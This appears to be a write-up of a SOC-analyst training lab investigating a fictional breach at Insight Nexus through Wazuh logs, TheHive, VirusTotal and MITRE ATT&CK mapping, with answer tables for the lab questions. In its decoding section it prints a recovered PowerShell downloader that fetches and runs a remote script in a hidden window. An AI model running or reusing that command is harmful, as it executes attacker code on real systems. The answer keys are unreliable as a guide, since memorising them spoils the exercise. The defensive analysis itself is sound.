## Overview

Incident investigation of a breach at **Insight Nexus**, a fictional mid-sized market research and data analytics firm headquartered in Singapore. Two threat actors operated in the environment simultaneously:

- **Crimson Fox** (primary) — suspected state-backed group, credential theft + long-term persistence for data exfiltration. Entered via default `admin/admin` credentials on an internet-facing **ManageEngine ADManager Plus** instance, pivoted through a misconfigured externally-exposed RDP host (`DEV-021`), created a rogue Domain Admin account, and used a GPO-deployed MSI package to push spyware across the domain.
- **Silent Jackal** (secondary) — low-skill, opportunistic group. Exploited an unpatched file upload vulnerability in a PHP-based client reporting portal and left a `checkme.txt` marker file as a calling card. No further activity beyond initial access.

Source material: an HTB SOC-analyst style scenario, investigated using a Wazuh log export (Sysmon + Windows Security + web/firewall logs).

## Environment

| Asset | Role |
|---|---|
| `manage.insightnexus.com` | ManageEngine ADManager Plus (internet-facing AD management) |
| `portal.insightnexus.com` | PHP-based client reporting portal (file upload enabled) |
| `DC01.insight.local` | Domain Controller |
| `FS01.insight.local` | File server (`\\fs01\projects` share) |
| `DB01.insight.local` | Database server |
| `DEV-001`–`DEV-120` | Developer workstation fleet; `DEV-021` had public RDP exposure |

## Investigation Questions

1. Identify the parent process (full path) that executed a credential dumping tool — Event ID 4688.
2. Identify the `imagePath` of a persistence mechanism established on `DB01`.
3. Identify the external IP address `diagnostics_data.zip` was exfiltrated to.
4. Identify the user account that attempted to connect to `\\fs01\projects`.

## Methodology

`wazuh_export.json` contains 200 Wazuh alert documents. 192 of these are generic "process created" (Event ID 4688) noise spread across all monitored hosts — a deliberate reflection of the "alert fatigue" problem described in the scenario. The other 8 carry custom Wazuh detection rules (tagged with `rule.groups` like `credential_access`, `persistence`, `exfiltration`, `lateral`) that flag the genuinely suspicious behavior. Each finding below was reached by filtering on the relevant rule group with `jq` rather than manually scanning all 200 events. Full methodology, raw evidence, and reasoning for each answer: [`notes.md`](./notes.md).

## Findings

| # | Question | Answer | Evidence |
|---|---|---|---|
| 1 | Parent process of credential dumping tool | `C:\Program Files\Mozilla Firefox\firefox.exe` | mimikatz.exe spawned as a child of Firefox on `SRV-MANAGE01` |
| 2 | Persistence `imagePath` on DB01 | `C:\Windows\PSEXESVC.exe` | PsExec service installed on `DB01` (Event ID 7045) |
| 3 | Exfil destination IP for `diagnostics_data.zip` | `93.184.216.34` | HTTPS POST from `updater.exe` on `SRV-MANAGE01` (Event ID 3) |
| 4 | User connecting to `\\fs01\projects` | `svc_admin` | SMB connection `SCDC01` → `FS01` over port 445 (Event ID 3) |

Screenshots of each confirmed answer and the corresponding terminal output are in [`screenshots/`](./screenshots).

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1078.004 – Valid Accounts (Cloud/Default Creds) | ManageEngine `admin/admin` login |
| Initial Access | T1190 – Exploit Public-Facing Application | PHP portal file upload |
| Credential Access | T1003 – OS Credential Dumping | mimikatz.exe executed via Firefox on `SRV-MANAGE01` |
| Persistence / Lateral Movement | T1569.002 – System Services: Service Execution (PsExec) | `PSEXESVC` service on `DB01` |
| Persistence | T1547 / T1543 / T1069 | GPO-deployed MSI, scheduled task |
| Discovery / Lateral Movement | T1021.002 – SMB/Windows Admin Shares | `svc_admin` connection to `\\fs01\projects` |
| Command & Control | T1071.001 – Web Protocols | HTTPS beacon to `cdn.evilcdn.net` / `93.184.216.34` |
| Exfiltration | T1560 / T1041 | `diagnostics_data.zip` uploaded to `93.184.216.34` |

## Lessons Learned

- Default credentials on internet-facing admin tools remain a top initial-access vector.
- Multiple concurrent intrusions can co-exist in one environment — a "loud" low-skill actor can mask a quieter, more capable one.
- Alert correlation across disparate log sources (web app auth, Sysmon, LDAP, file share access) is what actually surfaces the full picture.
- Narrative/report details from earlier in an incident (e.g. a C2 IP mentioned in the write-up) should never be assumed to apply to later events without re-verifying against the actual logs — this investigation surfaced two distinct attacker-controlled IPs, not one.

## Skills Assessment — SOC Triage & Threat Intel Enrichment

A follow-on exercise in the same module, working as a junior incident responder inside **TheHive** (SOC case management platform) against a live target (`ACADEMY-INCIDENT-HIVE`). Scope: triage and link the InsightNexus-specific alerts into a case, enrich findings via VirusTotal OSINT, map activity to MITRE ATT&CK, and deobfuscate a malicious PowerShell command recovered from a second Wazuh export (`logs-wazuh.zip`).

### Environment

| Asset | Role |
|---|---|
| `ACADEMY-INCIDENT-HIVE` (port 9000) | TheHive 5.2.15-3 instance, pre-loaded with 43 alerts |
| VirusTotal (Community account) | OSINT enrichment on IOCs surfaced in TheHive |
| MITRE ATT&CK (attack.mitre.org) | Technique lookup/confirmation |
| `logs-wazuh.json` | Second Wazuh export containing an obfuscated PowerShell downloader event |

### Task 1 — Case Creation & Alert Triage

Out of 43 total alerts in the instance, filtering by tag/title for `InsightNexus` narrows the list to exactly 2 alerts relevant to this scenario:

- `INX-ALERT-2025-00077` — "[InsightNexus] Admin Login via ManageEngine Web Console"
- `INX-WAZUH-2025-00080` — "[InsightNexus] Hacker tool Mimikatz was detected"

An empty case (`Insight Nexus Breach Investigation`) was created and both alerts were merged into it — the ManageEngine alert imported first, the Mimikatz alert merged in second via "Merge alert(s) into case."

### Task 2/3 — Enrichment & Validating the netstat Finding

The ManageEngine alert's comments contain analyst-captured `netstat -ano` output showing two external `ESTABLISHED` connections surviving a domain rejoin:

- `198.51.100.24:443`
- `203.0.113.18:4444` (port 4444 — classic Metasploit/reverse-shell default, immediately suspicious)

Both IPs were pivoted into VirusTotal for enrichment (see Findings below), and the results were added back as a comment on the alert — closing the loop from raw evidence to OSINT lookup to documented finding.

### Findings

| # | Question | Answer | Evidence |
|---|---|---|---|
| 1 | VT "Files Referring" filename on `203.0.113.18` | `MangoJava.exe` | VT Relations tab, Win32 EXE, 43/69 vendor detections |
| 2 | VT Whois city for `198.51.100.24` | `Los Angeles` | VT Details → Whois Lookup (IANA registrant record — this address falls in RFC 5737's documentation-reserved range, not a real ISP allocation) |
| 3 | MITRE technique for C2 tool transfer (file download from C2) | `T1105` — Ingress Tool Transfer | attack.mitre.org |
| 4 | MITRE technique for TheHive rule `92153` (VaultCli.dll / credential vault access) | `T1555` — Credential Access from Password Stores | TheHive alert "Suspicious process loaded VaultCli.dll module" |
| 5 | Suspicious IP in decoded PowerShell command (`logs-wazuh.json`) | `198.51.100.24` | Decoded `-EncodedCommand` payload — same IP as Q2 |
| 6 | User who executed the suspicious PowerShell command | `CORP\svc-update` | `eventdata.User` field, same Sysmon event |

Screenshots of TheHive triage, VirusTotal lookups, MITRE research, and the PowerShell decode are in [`screenshots/`](./screenshots).

### Methodology — Decoding the PowerShell Command

`logs-wazuh.json` (31 events) was filtered directly for the keyword `EncodedCommand`:

```bash
jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json
```

This isolates a single Sysmon Event ID 1 alert (Wazuh rule `34012`, level 12): "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)", flagged for the combination of `-EncodedCommand`, `-ExecutionPolicy Bypass`, and `-WindowStyle Hidden` — a textbook obfuscated-downloader pattern.

The Base64 payload was extracted and decoded:

```bash
jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json | grep -oP '(?<=-EncodedCommand )\S+' | base64 -d
```

Note: PowerShell's native `-EncodedCommand` is normally Base64-of-UTF-16LE, which requires piping through `iconv -f UTF-16LE -t UTF-8`. The first decode attempt assumed this and produced garbled/mojibake output. Inspecting the raw decoded bytes with `xxd` showed plain ASCII with no interleaved null bytes — this payload was Base64-encoded from plain text directly, so decoding with `base64 -d` alone (no `iconv`) produced the correct result:

```
IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```

A classic in-memory downloader/dropper: `IEX` pulls a remote script via `WebClient.DownloadString` (disguised with an antivirus-update-sounding filename), which then re-launches a second hidden PowerShell process to execute the payload from disk. The IP (`198.51.100.24`) matches the address enriched in Question 2, tying the delivery mechanism to the same attacker infrastructure identified via VirusTotal.

### MITRE ATT&CK Mapping — Skills Assessment

| Tactic | Technique | Evidence |
|---|---|---|
| Credential Access | T1003.001 – LSASS Memory | Mimikatz alert tags in TheHive |
| Credential Access | T1555 – Credential Access from Password Stores | VaultCli.dll alert (rule 92153) |
| Command & Control | T1105 – Ingress Tool Transfer | PowerShell `WebClient.DownloadString` from `198.51.100.24` |

### Lessons Learned — Skills Assessment

- A rule ID (e.g. TheHive rule `92153`) is often a faster, more reliable search key in a large alert list than free-text search, which may not index every field.
- Never assume PowerShell's `-EncodedCommand` encoding without checking — a raw `xxd` byte inspection is the fastest way to confirm UTF-16LE vs. plain-text Base64 before committing to a decode method.
- OSINT lookups (VirusTotal) and log-derived IOCs (the PowerShell C2 IP) corroborated each other independently — the same `198.51.100.24` surfaced from two unrelated evidence sources, strong confirmation it's genuine attacker infrastructure rather than noise.
